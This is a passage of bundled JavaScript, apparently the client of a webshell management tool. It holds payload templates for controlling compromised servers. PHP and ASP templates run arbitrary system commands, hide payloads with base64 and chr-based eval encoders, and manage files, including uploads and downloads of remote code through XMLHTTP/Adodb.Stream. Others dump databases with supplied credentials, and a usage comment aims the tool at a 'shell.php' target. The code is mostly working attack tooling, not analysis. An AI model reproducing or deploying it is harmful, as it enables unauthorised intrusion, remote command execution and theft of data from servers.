	  }, _argv.arg1, "#{base64::path}"),

	  wget: (_wget = {
	    _: "var X=new ActiveXObject(\"Microsoft.XMLHTTP\");var S=new ActiveXObject(\"Adodb.Stream\");S.Type=1;S.Mode=3;S.Open();X.Open(\"GET\",System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"])),false);X.Send();S.Write(X.ResponseBody);S.Position=0;S.SaveToFile(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg2 + "\"])),2);S.close;S=null;X=null;Response.Write(\"1\");"
	  }, _defineProperty(_wget, _argv.arg1, "#{base64::url}"), _defineProperty(_wget, _argv.arg2, "#{base64::path}"), _wget)
	};

/***/ },
/* 41 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./base64": 42,
		"./base64.jsx": 42,
		"./chr": 43,
		"./chr.jsx": 43
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 41;


/***/ },
/* 42 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {//
	// php::base64 编码模块
	//
	'use strict';

	module.exports = function (pwd, data) {
	  var randomID = '_0x' + Math.random().toString(16).substr(2);
	  data[randomID] = new Buffer(data['_']).toString('base64');
	  data[pwd] = 'eval(base64_decode($_POST[' + randomID + ']));';
	  delete data['_'];
	  return data;
	};
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 43 */
/***/ function(module, exports) {

	//
	// encoder::chr
	//
	// chr编码器
	// --------
	// 利用php函数`chr`进行编码处理
	//
	'use strict';

	module.exports = function (pwd, data) {
	  // 编码函数
	  var encode = function encode(php) {
	    var ret = [];
	    var i = 0;
	    while (i < php.length) {
	      ret.push(php[i].charCodeAt());
	      i++;
	    }
	    return 'eVAl(cHr(' + ret.join(').ChR(') + '));';
	  };

	  // 编码并去除多余数据
	  data[pwd] = encode(data._);
	  delete data._;

	  // 返回数据
	  return data;
	};

/***/ },
/* 44 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(global, Buffer) {'use strict';

	var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 代码模板::asp
	//

	var iconv = global.require('iconv-lite');

	var ASP = function () {
	  function ASP(opts) {
	    _classCallCheck(this, ASP);

	    this.__opts__ = opts;
	    this.parseTpl(['base', 'command', 'filemanager', 'database/sqlserver', 'database/mysql', 'database/oracle']);
	    this.parseEnr(['base64', 'hex']);
	  }

	  // 格式化函数


	  _createClass(ASP, [{
	    key: 'format',
	    value: function format() {
	      var encode = this.__opts__['encode'] || 'utf8';
	      return {
	        base64: function base64(str) {
	          // 编码
	          var _str_ = iconv.encode(new Buffer(str), encode);
	          return new Buffer(_str_).toString('base64');
	        },
	        // 转换为16进制::编码
	        hex: function hex(b) {
	          var ret = [];
	          var buff = iconv.encode(new Buffer(b), encode);

	          buff.toJSON()['data'].map(function (i) {
	            var _ = i.toString(16);
	            _.length < 2 ? _ = '0' + _ : null;
	            ret.push(_);
	          });

	          return ret.join('').toUpperCase();
	        },
	        // 转换为16进制::不编码
	        buffer: function buffer(b) {
	          var ret = [];

	          b.toJSON()['data'].map(function (i) {
	            var _ = i.toString(16);
	            _.length < 2 ? _ = '0' + _ : null;
	            ret.push(_);
	          });

	          return ret.join('').toUpperCase();
	        }
	      };
	    }

	    // 解析模板

	  }, {
	    key: 'parseTpl',
	    value: function parseTpl(tpl) {
	      var _this = this;

	      var _export = {};

	      // 模板格式化函数
	      var format = this.format();

	      // 加载模板代码
	      tpl.map(function (t) {
	        // 解析模板
	        _this[t.replace(/\//g, '_')] = {};
	        var m = __webpack_require__(45)("./" + t);
	        for (var _ in m) {
	          _this[t.replace(/\//g, '_')][_] = function (c) {
	            // 如果需要参数
	            if ((typeof c === 'undefined' ? 'undefined' : _typeof(c)) === 'object') {
	              return function (argv, success, error, hook) {
	                var data = $.extend({}, c);
	                // 格式化参数

	                var _loop = function _loop(d) {
	                  (data[d].match(/#{([\w\:]+)}/g) || []).map(function (tag) {
	                    var _t = tag.substr(2, tag.length - 3);
	                    // 如果需要字符处理
	                    var _f = _t.split('::');
	                    var _ff = void 0;
	                    if (_f.length > 0 && (_ff = format[_f[0]])) {
	                      // _t = _ff(argv[_f[1]] || _t);
	                      _t = _ff(argv[_f[1]] || '');
	                    } else {
	                      // _t = argv[_t] || _t;
	                      _t = argv[_t] || '';
	                    }
	                    data[d] = data[d].replace(tag, _t);
	                  });
	                };

	                for (var d in data) {
	                  _loop(d);
	                }
	                _this.ajax(data, success, error, hook);
	              };
	            } else {
	              var _ret2 = function () {
	                var data = {
	                  _: c
	                };
	                return {
	                  v: function v(success, error, hook) {
	                    _this.ajax(data, success, error, hook);
	                  }
	                };
	              }();

	              if ((typeof _ret2 === 'undefined' ? 'undefined' : _typeof(_ret2)) === "object") return _ret2.v;
	            }
	          }(m[_]);
	        }
	      });
	    }

	    // 解析编码模块

	  }, {
	    key: 'parseEnr',
	    value: function parseEnr(edr) {
	      var encoder = {
	        // 默认编码器
	        default: function _default(pwd, data) {
	          data[pwd] = data['_'];
	          delete data['_'];
	          return data;
	        }
	      };
	      edr.map(function (_) {
	        encoder[_] = __webpack_require__(53)("./" + _);
	      });
	      this.__encoder__ = encoder;
	    }
	  }, {
	    key: 'ajax',
	    value: function ajax(code, success, error, hook) {
	      var post = $.extend({}, code);
	      // 随机ID(用于监听数据来源)
	      var hash = (String(+new Date()) + String(Math.random())).substr(10, 10).replace('.', '_');
	      var tag_s = '->|';
	      var tag_e = '|<-';
	      var encode = this.__opts__['encode'] || 'utf8';

	      // post[]
	      // const code_base64 = this.format()['base64'](post['_']);

	      // post['_'] = `Response.Write("${tag_s");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("${code_base64}")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("${tag_e}");Response.End();`;

	      // 编码处理模板
	      var encoder = this.__encoder__[this.__opts__['encoder'] || 'default'] || this.__encoder__['default'];
	      var data = encoder(this.__opts__['pwd'], post);

	      // 监听数据返回
	      antSword['ipcRenderer']
	      // 请求完毕返回数据{text,buff}
	      .on('request-' + hash, function (event, arg) {
	        success(arg['text'], arg['buff']);
	      })
	      // HTTP请求返回字节流
	      .on('request-chunk-' + hash, function (event, ret) {
	        hook ? hook(ret) : null;
	      })
	      // 数据请求错误
	      .on('request-error-' + hash, function (event, ret) {
	        error ? error(ret) : null;
	      })
	      // 发送请求数据
	      .send('request', {
	        url: this.__opts__['url'],
	        hash: hash,
	        data: data,
	        tag_s: tag_s,
	        tag_e: tag_e,
	        encode: encode
	      });
	    }
	  }]);

	  return ASP;
	}();

	module.exports = ASP;
	/* WEBPACK VAR INJECTION */}.call(exports, (function() { return this; }()), __webpack_require__(5).Buffer))

/***/ },
/* 45 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./base": 46,
		"./base.jsx": 46,
		"./command": 47,
		"./command.jsx": 47,
		"./database/default": 48,
		"./database/default.jsx": 48,
		"./database/mysql": 49,
		"./database/mysql.jsx": 49,
		"./database/oracle": 50,
		"./database/oracle.jsx": 50,
		"./database/sqlserver": 51,
		"./database/sqlserver.jsx": 51,
		"./filemanager": 52,
		"./filemanager.jsx": 52
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 45;


/***/ },
/* 46 */
/***/ function(module, exports) {

	'use strict';

	//
	// 基础信息模板
	// 获取：当前路径、磁盘列表
	//

	module.exports = {
	  info: 'A'
	};

/***/ },
/* 47 */
/***/ function(module, exports) {

	'use strict';

	//
	// 命令执行模板
	//

	module.exports = {
	  exec: {
	    _: 'M',
	    'z1': '#{bin}',
	    'z2': '#{cmd}'
	  }
	};

/***/ },
/* 48 */
/***/ function(module, exports) {

	'use strict';

	//
	// 默认代码模板
	//
	// @params
	// :encode  SHELL编码
	// :conn    数据库连接字符串
	// :sql     执行SQL语句
	//

	module.exports = {
	  show_databases: {
	    _: 'N',
	    'z0': '#{encode}',
	    'z1': '#{conn}'
	  },
	  show_tables: {
	    _: 'O',
	    'z0': '#{encode}',
	    'z1': '#{conn}'
	  },
	  show_columns: {
	    _: 'P',
	    'z0': '#{encode}',
	    'z1': '#{conn}'
	  },
	  query: {
	    _: 'Q',
	    'z0': '#{encode}',
	    'z1': '#{conn}',
	    'z2': '#{sql}'
	  }
	};

/***/ },
/* 49 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	/*
	<T>XDB</T>
	<X>
	com.mysql.jdbc.Driver
	jdbc:mysql://localhost/test?user=root&password=123456
	</X>
	*/

	module.exports = __webpack_require__(48);

/***/ },
/* 50 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	/*
	<T>XDB</T>
	<X>
	oracle.jdbc.driver.OracleDriver
	jdbc:oracle:thin:user/password@127.0.0.1:1521/test
	</X>
	*/

	module.exports = __webpack_require__(48);

/***/ },
/* 51 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	/*
	<T>XDB</T>
	<X>
	com.microsoft.sqlserver.jdbc.SQLServerDriver
	jdbc:sqlserver://127.0.0.1:1433;databaseName=test;user=sa;password=123456
	</X>
	*/

	module.exports = __webpack_require__(48);

/***/ },
/* 52 */
/***/ function(module, exports) {

	'use strict';

	//
	// 文件管理模板
	//

	module.exports = {
	  dir: {
	    _: 'B',
	    'z1': '#{path}'
	  },

	  delete: {
	    _: 'E',
	    'z1': '#{path}'
	  },

	  create_file: {
	    _: 'D',
	    'z1': '#{path}',
	    'z2': '#{content}'
	  },

	  read_file: {
	    _: 'C',
	    'z1': '#{path}'
	  },

	  copy: {
	    _: 'H',
	    'z1': '#{path}',
	    'z2': '#{target}'
	  },

	  download_file: {
	    _: 'F',
	    'z1': '#{path}'
	  },

	  upload_file: {
	    _: 'U',
	    'z1': '#{path}',
	    'z2': '#{hex::content}'
	  },

	  rename: {
	    _: 'I',
	    'z1': '#{path}',
	    'z2': '#{name}'
	  },

	  retime: {
	    _: 'K',
	    'z1': '#{path}',
	    'z2': '#{time}'
	  },

	  mkdir: {
	    _: 'J',
	    'z1': '#{path}'
	  },

	  wget: {
	    _: 'L',
	    'z1': '#{url}',
	    'z2': '#{path}'
	  }
	};

/***/ },
/* 53 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./base64": 54,
		"./base64.jsx": 54,
		"./hex": 55,
		"./hex.jsx": 55
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 53;


/***/ },
/* 54 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {//
	// custom::base64 编码模块
	//
	// :把除了密码的其他参数都base64编码一次
	//

	'use strict';

	module.exports = function (pwd, data) {
	  var ret = {};
	  for (var _ in data) {
	    if (_ === '_') {
	      continue;
	    };
	    ret[_] = new Buffer(data[_]).toString('base64');
	  }
	  ret[pwd] = data['_'];
	  return ret;
	};
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 55 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {//
	// 16进制编码模块
	//

	'use strict';

	module.exports = function (pwd, data) {
	  var ret = {};
	  for (var _ in data) {
	    if (_ === '_') {
	      continue;
	    };
	    ret[_] = new Buffer(data[_]).toString('hex');
	  }
	  ret[pwd] = data['_'];
	  return ret;
	};
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 56 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(global, Buffer) {'use strict';

	var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 代码模板::php
	//
	/*
	用法：
	const php = new PHP({
	  url: 'http://target/shell.php',
	  pwd: 'shell',
	  encode: 'gbk',
	  encoder: 'base64'
	});

	// 基本信息
	php.base.info((ret) => {
	  
	});
	// 执行命令
	php.command.system({
	  cmd:'whoami',
	  bin: '/bin/sh'
	}, (ret) => {
	  
	});
	...
	*/

	var iconv = global.require('iconv-lite');

	var PHP = function () {
	  function PHP(opts) {
	    _classCallCheck(this, PHP);

	    this.__opts__ = opts;
	    this.parseTpl(['base', 'command', 'filemanager', 'database/mysql', 'database/mssql', 'database/oracle', 'database/informix']);
	    this.parseEnr(['base64', 'chr']);
	  }

	  // 格式化函数


	  _createClass(PHP, [{
	    key: 'format',
	    value: function format() {
	      var encode = this.__opts__['encode'] || 'utf8';
	      return {
	        base64: function base64(str) {
	          // 编码
	          var _str_ = iconv.encode(new Buffer(str), encode);
	          return new Buffer(_str_).toString('base64');
	        },
	        // 转换为16进制::编码
	        hex: function hex(b) {
	          // let ret = [];
	          var buff = iconv.encode(new Buffer(b), encode);
	          return new Buffer(buff).toString('hex').toUpperCase();

	          // buff.toJSON()['data'].map((i) => {
	          //   let _ = i.toString(16);
	          //   _.length < 2 ? _ = `0${_}` : null;
	          //   ret.push(_);
	          // });

	          // return ret.join('').toUpperCase();
	        },
	        // 转换为16进制::不编码
	        buffer: function buffer(b) {
	          return new Buffer(b).toString('hex').toUpperCase();
	          // let ret = [];

	          // b.toJSON()['data'].map((i) => {
	          //   let _ = i.toString(16);
	          //   _.length < 2 ? _ = `0${_}` : null;
	          //   ret.push(_);
	          // });

	          // return ret.join('').toUpperCase();
	        }
	      };
	    }

	    // 解析模板

	  }, {
	    key: 'parseTpl',
	    value: function parseTpl(tpl) {
	      var _this = this;

	      var _export = {};

	      // 模板格式化函数
	      var format = this.format();

	      // 加载模板代码
	      tpl.map(function (t) {
	        // 解析模板
	        _this[t.replace(/\//g, '_')] = {};
	        var m = __webpack_require__(57)("./" + t);
	        for (var _ in m) {
	          _this[t.replace(/\//g, '_')][_] = function (c) {
	            // 如果需要参数
	            if ((typeof c === 'undefined' ? 'undefined' : _typeof(c)) === 'object') {
	              return function (argv, success, error, hook) {
	                var data = $.extend({}, c);
	                // 格式化参数

	                var _loop = function _loop(d) {
	                  (data[d].match(/#{([\w\:]+)}/g) || []).map(function (tag) {
	                    var _t = tag.substr(2, tag.length - 3);
	                    // 如果需要字符处理
	                    var _f = _t.split('::');
	                    var _ff = void 0;
	                    if (_f.length > 0 && (_ff = format[_f[0]])) {
	                      // _t = _ff(argv[_f[1]] || _t);
	                      _t = _ff(argv[_f[1]] || '');
	                    } else {
	                      // _t = argv[_t] || _t;
	                      _t = argv[_t] || '';
	                    }
	                    data[d] = data[d].replace(tag, _t);
	                  });
	                };

	                for (var d in data) {
	                  _loop(d);
	                }
	                _this.ajax(data, success, error, hook);
	              };
	            } else {
	              var _ret2 = function () {
	                var data = {
	                  _: c
	                };
	                return {
	                  v: function v(success, error, hook) {
	                    _this.ajax(data, success, error, hook);
	                  }
	                };
	              }();

	              if ((typeof _ret2 === 'undefined' ? 'undefined' : _typeof(_ret2)) === "object") return _ret2.v;
	            }
	          }(m[_]);
	        }
	      });
	    }

	    // 解析编码模块

	  }, {
	    key: 'parseEnr',
	    value: function parseEnr(edr) {
	      var encoder = {
	        // 默认编码器
	        default: function _default(pwd, data) {
	          data[pwd] = data['_'];
	          delete data['_'];
	          return data;
	        }
	      };
	      edr.map(function (_) {
	        encoder[_] = __webpack_require__(66)("./" + _);
	      });
	      this.__encoder__ = encoder;
	    }
	  }, {
	    key: 'ajax',
	    value: function ajax(code, success, error, hook) {
	      // 补全代码
	      var post = $.extend({}, code);
	      // 随机ID(用于监听数据来源)
	      var hash = (String(+new Date()) + String(Math.random())).substr(10, 10).replace('.', '_');
	      var tag_s = '-=:{';
	      var tag_e = '}:=-';
	      var encode = this.__opts__['encode'] || 'utf8';

	      post['_'] = '@ini_set("display_errors", "0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo "' + tag_s + '";' + post['_'] + ';echo "' + tag_e + '";die();';

	      // 编码处理模板
	      var encoder = this.__encoder__[this.__opts__['encoder'] || 'default'] || this.__encoder__['default'];
	      var data = encoder(this.__opts__['pwd'], post);

	      // 监听数据返回
	      antSword['ipcRenderer']
	      // 请求完毕返回数据{text,buff}
	      .on('request-' + hash, function (event, arg) {
	        success(arg['text'], arg['buff']);
	      })
	      // HTTP请求返回字节流
	      .on('request-chunk-' + hash, function (event, ret) {
	        hook ? hook(ret) : null;
	      })
	      // 数据请求错误
	      .on('request-error-' + hash, function (event, ret) {
	        error ? error(ret) : null;
	      })
	      // 发送请求数据
	      .send('request', {
	        url: this.__opts__['url'],
	        hash: hash,
	        data: data,
	        tag_s: tag_s,
	        tag_e: tag_e,
	        encode: encode
	      });
	    }
	  }]);

	  return PHP;
	}();

	module.exports = PHP;
	/* WEBPACK VAR INJECTION */}.call(exports, (function() { return this; }()), __webpack_require__(5).Buffer))

/***/ },
/* 57 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./argv": 58,
		"./argv.jsx": 58,
		"./base": 59,
		"./base.jsx": 59,
		"./command": 60,
		"./command.jsx": 60,
		"./database/informix": 61,
		"./database/informix.jsx": 61,
		"./database/mssql": 62,
		"./database/mssql.jsx": 62,
		"./database/mysql": 63,
		"./database/mysql.jsx": 63,
		"./database/oracle": 64,
		"./database/oracle.jsx": 64,
		"./filemanager": 65,
		"./filemanager.jsx": 65
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 57;


/***/ },
/* 58 */
/***/ function(module, exports) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});
	/**
	 * 在模板中使用
	 * 1. 加载需要的参数列表： import { arg1, arg2, arg3 } from './argv';
	 * 2. 嵌入代码参数中：codes={[arg1]: `echo "${arg1}";`}...
	 **/

	var random = function random() {
	  return "0x" + (Math.random() + Math.random()).toString(16).substr(2);
	};

	var arg1 = exports.arg1 = random();
	var arg2 = exports.arg2 = random();
	var arg3 = exports.arg3 = random();
	var arg4 = exports.arg4 = random();
	var arg5 = exports.arg5 = random();
	var arg6 = exports.arg6 = random();

/***/ },
/* 59 */
/***/ function(module, exports) {

	"use strict";

	//
	// 基础信息模板
	// :用于获取系统信息、当前用户、路径、盘符列表
	//

	module.exports = {
	  info: "$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);$R=\"{$D}\t\";if(substr($D,0,1)!=\"/\"){foreach(range(\"A\",\"Z\")as $L)if(is_dir(\"{$L}:\"))$R.=\"{$L}:\";}else{$R.=\"/\";}$R.=\"\t\";$u=(function_exists(\"posix_getegid\"))?@posix_getpwuid(@posix_geteuid()):\"\";$s=($u)?$u[\"name\"]:@get_current_user();$R.=php_uname();$R.=\"\t{$s}\";echo $R;"
	};

/***/ },
/* 60 */
/***/ function(module, exports, __webpack_require__) {

	"use strict";

	var _exec, _quote;

	var _argv = __webpack_require__(58);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 命令执行模板
	// :默认使用`exec`代码模板
	//

	module.exports = {
	  exec: (_exec = {
	    _: "$p=base64_decode($_POST[\"" + _argv.arg1 + "\"]);$s=base64_decode($_POST[\"" + _argv.arg2 + "\"]);$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$c=substr($d,0,1)==\"/\"?\"-c \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";$r=\"{$p} {$c}\";@system($r.\" 2>&1\",$ret);print ($ret!=0)?\"ret={$ret}\":\"\";"
	  }, _defineProperty(_exec, _argv.arg1, "#{base64::bin}"), _defineProperty(_exec, _argv.arg2, "#{base64::cmd}"), _exec),

	  quote: (_quote = {
	    _: "$p=base64_decode($_POST[\"" + _argv.arg1 + "\"]);$s=base64_decode($_POST[\"" + _argv.arg2 + "\"]);$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$c=substr($d,0,1)==\"/\"?\"-c \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";$r=\"{$p} {$c}\";echo `{$r} 2>&1`"
	  }, _defineProperty(_quote, _argv.arg1, "#{base64::bin}"), _defineProperty(_quote, _argv.arg2, "#{base64::cmd}"), _quote)
	};

/***/ },
/* 61 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_databases, _show_tables, _show_columns, _query;

	var _argv = __webpack_require__(58);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 数据库管理模板::informix
	//
	// :分隔符为  ->  \t|\t

	module.exports = {
	  // 显示所有数据库
	  show_databases: (_show_databases = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query("SELECT username FROM SYSUSERS WHERE usertype=\'D\' ORDER BY username",$T);echo("informix".chr(9));while($rs=@ifx_fetch_row($q)){echo(trim($rs[username]).chr(9));}@ifx_close($T);'
	  }, _defineProperty(_show_databases, _argv.arg1, '#{host}'), _defineProperty(_show_databases, _argv.arg2, '#{user}'), _defineProperty(_show_databases, _argv.arg3, '#{passwd}'), _show_databases),
	  // 显示数据库所有表
	  show_tables: (_show_tables = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query("SELECT tabname FROM systables where owner=\'{$dbn}\' and tabtype=\'T\' ORDER BY tabname",$T);while($rs=@ifx_fetch_row($q)){echo(trim($rs[tabname]).chr(9));}@ifx_close($T);'
	  }, _defineProperty(_show_tables, _argv.arg1, '#{host}'), _defineProperty(_show_tables, _argv.arg2, '#{user}'), _defineProperty(_show_tables, _argv.arg3, '#{passwd}'), _defineProperty(_show_tables, _argv.arg4, '#{db}'), _show_tables),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query("SELECT tabname FROM systables where owner=\'{$dbn}\' and tabtype=\'T\' ORDER BY tabname",$T);while($rs=@ifx_fetch_row($q)){echo(trim($rs[tabname]).chr(9));}@ifx_close($T);'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{host}'), _defineProperty(_show_columns, _argv.arg2, '#{user}'), _defineProperty(_show_columns, _argv.arg3, '#{passwd}'), _defineProperty(_show_columns, _argv.arg4, '#{table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$sql=base64_decode($_POST["' + _argv.arg5 + '"]);$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query($sql,$T);$i=0;while($rs=@ifx_fetch_row($q)){if($i==0){for(reset($rs);$f=key($rs);next($rs)){echo($f."\t|\t");}echo("\r\n");}for(reset($rs);$f=key($rs);next($rs)){echo(trim($rs[$f]));echo("\t|\t");}echo("\r\n");$i++;}@ifx_close($T);'
	  }, _defineProperty(_query, _argv.arg1, '#{host}'), _defineProperty(_query, _argv.arg2, '#{user}'), _defineProperty(_query, _argv.arg3, '#{passwd}'), _defineProperty(_query, _argv.arg4, '#{db}'), _defineProperty(_query, _argv.arg5, '#{base64::sql}'), _query)
	};

/***/ },
/* 62 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_databases, _show_tables, _show_columns, _query;

	var _argv = __webpack_require__(58);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 数据库管理模板::mssql
	//
	// :分隔符为  ->  \t|\t

	module.exports = {
	  // 显示所有数据库
	  show_databases: (_show_databases = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$T=@mssql_connect($hst,$usr,$pwd);$q=@mssql_query("select [name] from master.dbo.sysdatabases order by 1",$T);while($rs=@mssql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mssql_free_result($q);@mssql_close($T);'
	  }, _defineProperty(_show_databases, _argv.arg1, '#{host}'), _defineProperty(_show_databases, _argv.arg2, '#{user}'), _defineProperty(_show_databases, _argv.arg3, '#{passwd}'), _show_databases),
	  // 显示数据库所有表
	  show_tables: (_show_tables = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$T=@mssql_connect($hst,$usr,$pwd);@mssql_select_db($dbn,$T);$q=@mssql_query("SELECT [name] FROM sysobjects WHERE (xtype=\'U\' OR xtype=\'S\') ORDER BY 1",$T);while($rs=@mssql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mssql_free_result($q);@mssql_close($T);'
	  }, _defineProperty(_show_tables, _argv.arg1, '#{host}'), _defineProperty(_show_tables, _argv.arg2, '#{user}'), _defineProperty(_show_tables, _argv.arg3, '#{passwd}'), _defineProperty(_show_tables, _argv.arg4, '#{db}'), _show_tables),
	  // 显示表字段
	  show_columns: (_show_columns = {
